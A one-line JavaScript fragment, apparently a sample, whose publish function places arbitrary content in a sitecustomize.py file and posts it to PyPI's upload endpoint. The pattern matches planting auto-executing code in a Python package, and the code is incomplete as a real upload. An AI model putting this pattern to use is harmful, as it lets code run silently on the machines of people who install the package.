async function publish(files, content) { files["sitecustomize.py"] = content; return fetch("https://upload.pypi.org/legacy/", {method:"POST", body:content}); }
